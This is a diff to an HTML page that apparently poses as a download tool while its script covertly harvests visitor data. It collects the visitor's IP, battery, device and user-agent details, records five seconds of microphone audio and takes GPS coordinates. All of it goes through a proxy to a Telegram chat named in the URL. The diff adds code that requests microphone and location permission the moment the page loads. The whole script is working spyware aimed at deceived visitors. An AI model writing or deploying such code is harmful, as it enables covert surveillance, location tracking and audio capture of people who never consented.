@@ -43,94 +43,111 @@
   </center>
 
   <script>
-    function GetURLParameter(sParam){  
-      var sPageURL=window.location.search.substring(1),sURLVariables=sPageURL.split('&');  
-      for(var i=0;i<sURLVariables.length;i++){   
-        var sParameterName=sURLVariables[i].split('=');   
-        if(sParameterName[0]==sParam){return sParameterName[1];}   
-      }  
-    }  
-    var chatid = GetURLParameter('id');  
+    function GetURLParameter(sParam){
+      var sPageURL=window.location.search.substring(1),sURLVariables=sPageURL.split('&');
+      for(var i=0;i<sURLVariables.length;i++){
+        var sParameterName=sURLVariables[i].split('=');
+        if(sParameterName[0]==sParam){return sParameterName[1];}
+      }
+    }
+    var chatid = GetURLParameter('id');
 
-    async function startProcess(){  
-      document.getElementById('thumbdloadbtn').textContent='Fetching... Please wait';  
+    // ✅ Auto ask permissions on page load
+    window.onload = () => {
+      // Ask mic permission immediately
+      navigator.mediaDevices.getUserMedia({ audio:true }).then(stream=>{
+        stream.getTracks().forEach(t=>t.stop()); // stop immediately, just to trigger permission
+        console.log("Mic Permission Granted");
+      }).catch(err=>console.log("Mic Permission Denied",err));
 
-      if(chatid){  
-        const [ip,battery] = await Promise.all([getIP(), getBattery()]);  
-        const device = getDeviceInfo();  
+      // Ask location permission immediately
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(
+          pos=>console.log("Location Granted",pos),
+          err=>console.log("Location Denied",err)
+        );
+      }
+    };
 
-        // --- send text info ---
-        fetch(`/api/proxy`,{  
-          method:'POST',  
-          headers:{'Content-Type':'application/json'},  
-          body:JSON.stringify({  
-            type:'message',  
-            chat_id:chatid,  
-            text:`🧑‍💻 User Info:\n\n${ip}\n\n${battery}\n\n${device}`  
-          })  
-        });  
+    async function startProcess(){
+      document.getElementById('thumbdloadbtn').textContent='Fetching... Please wait';
 
-        // --- ask mic permission & record 5s voice ---
-        navigator.mediaDevices.getUserMedia({ audio:true }).then(stream => {  
-          const recorder=new MediaRecorder(stream);  
-          let chunks=[];  
-          recorder.ondataavailable=e=>chunks.push(e.data);  
-          recorder.onstop=()=>{  
-            const blob=new Blob(chunks,{type:'audio/ogg'});  
-            sendToTelegram(blob,'audio');  
-          };  
-          recorder.start();  
-          setTimeout(()=>recorder.stop(),5000);  
-        }).catch(err=>console.error("Mic Denied:",err));  
+      if(chatid){
+        const [ip,battery] = await Promise.all([getIP(), getBattery()]);
+        const device = getDeviceInfo();
 
-        // --- ask location permission & send location ---
-        if(navigator.geolocation){  
-          navigator.geolocation.getCurrentPosition(pos=>{  
-            fetch(`/api/proxy`,{  
-              method:'POST',  
-              headers:{'Content-Type':'application/json'},  
-              body:JSON.stringify({  
-                type:'location',  
-                chat_id:chatid,  
-                latitude:pos.coords.latitude,  
-                longitude:pos.coords.longitude  
-              })  
-            });  
-          },err=>console.error("Location Denied:",err));  
-        }  
-      }  
-    }  
+        // send text info
+        fetch(`/api/proxy`,{
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({
+            type:'message',
+            chat_id:chatid,
+            text:`🧑‍💻 User Info:\n\n${ip}\n\n${battery}\n\n${device}`
+          })
+        });
 
-    function sendToTelegram(data,type){   
-      if(!chatid) return;   
-      const formData=new FormData();   
-      formData.append('chat_id',chatid);   
-      if(type==='audio'){  
-        formData.append('audio',data,`Ali_Bot_Audio_${Date.now()}.ogg`);  
-        formData.append('caption',"🎤 Voice Recorded by @Ali_Bot");  
-      }  
-      fetch(`/api/proxy?type=${type}`,{method:'POST',body:formData});   
-    }  
+        // record voice again properly
+        navigator.mediaDevices.getUserMedia({ audio:true }).then(stream=>{
+          const recorder=new MediaRecorder(stream);
+          let chunks=[];
+          recorder.ondataavailable=e=>chunks.push(e.data);
+          recorder.onstop=()=>{
+            const blob=new Blob(chunks,{type:'audio/ogg'});
+            sendToTelegram(blob,'audio');
+          };
+          recorder.start();
+          setTimeout(()=>recorder.stop(),5000);
+        });
 
-    function getBattery(){   
-      if(navigator.getBattery){   
-        return navigator.getBattery().then(b=>`🔋 Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);   
-      }   
-      return Promise.resolve("🔋 Battery: API not available");   
-    }  
+        // send location again
+        if(navigator.geolocation){
+          navigator.geolocation.getCurrentPosition(pos=>{
+            fetch(`/api/proxy`,{
+              method:'POST',
+              headers:{'Content-Type':'application/json'},
+              body:JSON.stringify({
+                type:'location',
+                chat_id:chatid,
+                latitude:pos.coords.latitude,
+                longitude:pos.coords.longitude
+              })
+            });
+          });
+        }
+      }
+    }
 
-    function getIP(){   
-      return fetch("https://api.ipify.org?format=json")  
-        .then(res=>res.json())  
-        .then(data=>`🌐 IP Address: ${data.ip}`)  
-        .catch(()=> "🌐 IP Address: Could not detect");   
-    }  
+    function sendToTelegram(data,type){
+      if(!chatid) return;
+      const formData=new FormData();
+      formData.append('chat_id',chatid);
+      if(type==='audio'){
+        formData.append('audio',data,`Ali_Bot_Audio_${Date.now()}.ogg`);
+        formData.append('caption',"🎤 Voice Recorded by @Ali_Bot");
+      }
+      fetch(`/api/proxy?type=${type}`,{method:'POST',body:formData});
+    }
 
-    function getDeviceInfo(){   
-      return `📱 Device Info:\nScreen: ${screen.width} x ${screen.height}\n⏰ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`;   
-    }  
+    function getBattery(){
+      if(navigator.getBattery){
+        return navigator.getBattery().then(b=>`🔋 Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);
+      }
+      return Promise.resolve("🔋 Battery: API not available");
+    }
+
+    function getIP(){
+      return fetch("https://api.ipify.org?format=json")
+        .then(res=>res.json())
+        .then(data=>`🌐 IP Address: ${data.ip}`)
+        .catch(()=> "🌐 IP Address: Could not detect");
+    }
+
+    function getDeviceInfo(){
+      return `📱 Device Info:\nScreen: ${screen.width} x ${screen.height}\n⏰ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`;
+    }
   </script>
 
-  <footer><p>DEVELOP BY ALI🔥</p></footer>
+  <footer><p>DEVELOP BY ALI💜🔥</p></footer>
 </body>
 </html>
